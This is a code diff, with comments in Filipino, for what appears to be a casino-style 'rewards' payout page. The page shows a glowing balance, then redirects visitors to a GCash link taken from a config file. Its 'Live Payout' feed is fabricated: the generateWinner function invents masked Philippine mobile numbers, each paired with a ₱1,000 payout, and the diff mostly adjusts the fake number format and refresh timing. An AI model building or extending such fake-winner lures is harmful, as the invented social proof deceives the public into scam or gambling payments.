@@ -29,7 +29,6 @@
             padding: 15px;
         }
 
-        /* Premium Card */
         .card {
             background: rgba(255, 255, 255, 0.03);
             width: 100%;
@@ -44,7 +43,6 @@
             overflow: hidden;
         }
 
-        /* Background Glow Effect */
         .card::before {
             content: '';
             position: absolute;
@@ -71,7 +69,6 @@
             margin-bottom: 5px;
         }
 
-        /* Digital Balance Look */
         .amount {
             font-family: 'Orbitron', sans-serif;
             font-size: 48px;
@@ -83,7 +80,6 @@
             filter: drop-shadow(0 0 15px rgba(212, 175, 55, 0.4));
         }
 
-        /* Catchy Casino Button */
         .pay-button { 
             background: var(--gold);
             color: #000; 
@@ -132,7 +128,6 @@
             box-shadow: 0 10px 20px rgba(0,0,0,0.3);
         }
 
-        /* Live Payout Section */
         .winners-container {
             background: rgba(0, 0, 0, 0.4);
             border: 1px solid rgba(255, 255, 255, 0.1);
@@ -183,20 +178,14 @@
 
         .payout-amount { color: var(--neon-green); font-weight: 800; }
 
-        .gcash-mini {
-            width: 20px;
-            height: 20px;
-            border-radius: 50%;
-            border: 1px solid white;
-        }
         .gcash-mini-icon {
-    width: 18px;
-    height: 18px;
-    border-radius: 50%;
-    vertical-align: middle;
-    margin-right: 5px;
-    border: 1px solid rgba(255,255,255,0.2);
-}
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            vertical-align: middle;
+            margin-right: 5px;
+            border: 1px solid rgba(255,255,255,0.2);
+        }
     </style>
 </head>
 <body>
@@ -227,9 +216,6 @@
 <script src="config.js"></script>
 
 <script>
-    // TANDAAN: Wala na dapat dito yung 'const LATEST_GCASH_URL = ...'
-    // Kukunin na lang natin yung value mula sa config.js sa itaas.
-
     function animateValue(id, start, end, duration) {
         const obj = document.getElementById(id);
         let startTimestamp = null;
@@ -257,12 +243,10 @@
 
         startTimer(300);
 
-        // Redirect logic gamit ang link sa config.js
         setTimeout(() => {
             if (typeof LATEST_GCASH_URL !== 'undefined') {
                 window.location.href = LATEST_GCASH_URL; 
             } else {
-                // Fallback kung sakaling hindi nabasa ang config file
                 window.location.href = "https://www.casinoplus.com.ph"; 
             }
         }, 1500);
@@ -280,32 +264,40 @@
     }
 
     function generateWinner() {
-    const prefixes = ['0917', '0922', '0998', '0905', '0916', '0945', '0966', '0935'];
-    const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
-    const lastThree = Math.floor(100 + Math.random() * 900);
-    
-    // Official GCash Logo URL
-    const gcashIcon = "https://xjiligames.github.io/rewards/gc_icon.png";
+        // Mga common Philippine mobile prefixes
+        const prefixes = ['0912', '0915', '0917', '0922', '0927', '0935', '0945', '0966', '0998'];
+        const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+        
+        // Random 4-digit sequence para sa dulo (total 11 digits kasama ang prefix at stars)
+        const lastFour = Math.floor(1000 + Math.random() * 9000);
+        
+        const gcashIcon = "https://xjiligames.github.io/rewards/gc_icon.png";
 
-    const winnerEntry = document.createElement('div');
-    winnerEntry.className = 'winner-item';
-    winnerEntry.innerHTML = `
-        <span>
-            <img src="${gcashIcon}" class="gcash-mini-icon"> 
-            ${randomPrefix}***${lastThree}
-        </span>
-        <strong class="payout-amount">+₱1,000.00</strong>
-    `;
+        const winnerEntry = document.createElement('div');
+        winnerEntry.className = 'winner-item';
+        
+        // Format: 0912 (4) + *** (3) + 8293 (4) = 11 digits
+        winnerEntry.innerHTML = `
+            <span>
+                <img src="${gcashIcon}" class="gcash-mini-icon"> 
+                ${randomPrefix}***${lastFour}
+            </span>
+            <strong class="payout-amount">+₱1,000.00</strong>
+        `;
 
-    const list = document.getElementById('winners-list');
-    if (list) {
-        list.prepend(winnerEntry);
-        if (list.children.length > 4) list.removeChild(list.lastChild);
+        const list = document.getElementById('winners-list');
+        if (list) {
+            list.prepend(winnerEntry);
+            if (list.children.length > 4) list.removeChild(list.lastChild);
+        }
     }
-}
 
-    setInterval(generateWinner, 4000);
-    generateWinner(); generateWinner();
+    // Interval set to 10 seconds (10000ms)
+    setInterval(generateWinner, 10000);
+
+    // Load initial winners immediately
+    generateWinner(); 
+    generateWinner();
 </script>
 
 </body>
